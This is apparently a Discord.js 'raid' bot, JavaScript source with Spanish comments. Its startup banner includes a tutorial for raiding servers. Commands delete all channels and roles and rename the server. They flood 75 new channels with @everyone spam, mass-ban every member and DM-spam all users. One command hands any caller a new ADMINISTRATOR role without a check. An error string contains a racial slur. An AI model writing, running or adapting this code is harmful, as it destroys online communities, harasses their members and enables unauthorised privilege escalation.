const { Client, Intents, MessageEmbed } = require("discord.js");
const chalk = require("chalk");


const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS
  ]
});

client.once("ready", () => {
  console.log(chalk.red(`\nBot Encendido Cliente ${client.user.tag}\n`));

  console.log(chalk.cyan(`
                                          [+] Comandos:
                                           ღ .on | (prende el modo de mantenimiento) eheheheh
                                           ღ .nuke | (borra todos los canales, solo se utiliza cuando se va a remodelar.)
                                           ღ .admin | (hace roles de admin)
                                           ღ .crearroles / . eliminarroles | (se usa cuando van a remodelar)
                                           ღ .banall | banneo a todos (se usa cuando se muda de server)
                                           ღ .mdall | mensaje a todos
                                           ღ .lista | Obten informacion
                                           ღ Creditos | el code esta hecho por otra persona pero lo he remodelado para que sea utilizable denuevo... att. zspunky_rip
                                           ღ Tutorial | Para raidear recomiendo hacer lo sig: (.nuke, .on) si quieres hacer mas destrozo: (.eliminarroles, .nuke, .on, esperar un toque y reiniciar el bot y hacer .banall)
`));

  presencia();
});

function presencia() {
  client.user.setPresence({
    status: "online",
    activities: [{ name: "#Spunky", type: "PLAYING" }]
  });
}

// .on
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === ".on") {
    console.log(chalk.green(`[+] DETERMINACION`));
    try {
      await message.delete();

      await message.guild.setName("Modificar");
      await message.guild.setIcon("https://cdn.discordapp.com/attachments/1322465278965059588/1322618018357973002/image.png");
      console.log(chalk.blue(`[+] Renamed`));

      const mensaje = "@everyone Modificar Mensaje";

      for (let i = 0; i < 75; i++) {
        const channel = await message.guild.channels.create("RAIDEADOS", { type: "GUILD_TEXT" });
        console.log(chalk.green(`[+] ${channel.name}`));
        for (let j = 0; j < 100; j++) {
          channel.send(mensaje).catch((err) => console.error(`Error...? ${err.message}`));
        }
      }

      console.log(chalk.yellow(`[+] Done...`));
    } catch (error) {
      console.error(`Error...? ${error.message}`);
    }
  }
});

// .admin
client.on("messageCreate", async (msg) => {
  if (msg.author.bot) return;

  if (msg.content.toLowerCase().startsWith(".admin")) {
    try {
      const role = await msg.guild.roles.create({
        name: "ADMIN",
        color: "B9BBBE",
        permissions: ["ADMINISTRATOR"],
        hoisted: false
      });

      await msg.member.roles.add(role);
      if (msg.deletable) await msg.delete();
    } catch (error) {
      console.error(`Error: ${error.message}`);
    }
  }
});

// .lista
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === ".lista") {
    try {
      await message.delete();
      const embed = new MessageEmbed()
        .setTitle("Informacion de proceso del raid")
        .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
        .setColor("RED");

      await message.channel.send({ embeds: [embed] });
    } catch (error) {
      console.error(`xsi (creo q e innecesario xd): ${error.message}`);
    }
  }
});

// .banall
client.on("messageCreate", async (message) => {
  if (message.content.startsWith(".banall")) {
    try {
      await message.delete();

      if (!message.member.permissions.has(["BAN_MEMBERS", "ADMINISTRATOR"])) return;

      const members = await message.guild.members.fetch();
      const protectedIDs = ["1024055611702398976"];

      members.forEach((member) => {
        if (!protectedIDs.includes(member.id) && member.bannable) {
          member.ban({ reason: "Skill Issue" }).catch((err) => console.error(`este we es invencible sorry: ${member.user.tag}: ${err.message}`));
        }
      });
    } catch (error) {
      console.error(`Error banana: ${error.message}`);
    }
  }
});

// .nuke
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === ".nuke") {
    try {
      await message.delete();
      const channels = await message.guild.channels.cache;
      channels.forEach(channel => channel.delete());

      const mainChannel = await message.guild.channels.create("Nuked", { type: "GUILD_TEXT" });
      await mainChannel.send("Modificar Mensaje");
    } catch (error) {
      console.error(`:v: ${error.message}`);
    }
  }
});

// .mdall
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === ".mdall") {
    try {
      await message.delete();
      const members = await message.guild.members.fetch();

      members.forEach((member) => {
        if (!member.user.bot) {
          setTimeout(() => {
            member.send("@everyone Modificar Mensaje").catch((err) => console.error(`o me kickearon o nomas el we desactivo md: ${member.user.tag}: ${err.message}`));
          }, 450);
        }
      });
    } catch (error) {
      console.error(`Error: ${error.message}`);
    }
  }
});

// .eliminarroles
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === ".eliminarroles") {
    try {
      await message.delete();
      const roles = message.guild.roles.cache.filter(role => role.name !== "@everyone");
      roles.forEach(role => role.delete().catch((err) => console.error(`Rol invencible xd: ${err.message}`)));
    } catch (error) {
      console.error(`NIGGA: ${error.message}`);
    }
  }
});

// .crearroles
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content === ".crearroles") {
    try {
      await message.delete();
      for (let i = 0; i < 50; i++) {
        await message.guild.roles.create({ name: `Rolsito do Raid ${i + 1}`, color: '#d41818' });
      }
    } catch (error) {
      console.error(`OOPS: ${error.message}`);
    }
  }
});

client.login("hola aca va el token xd");
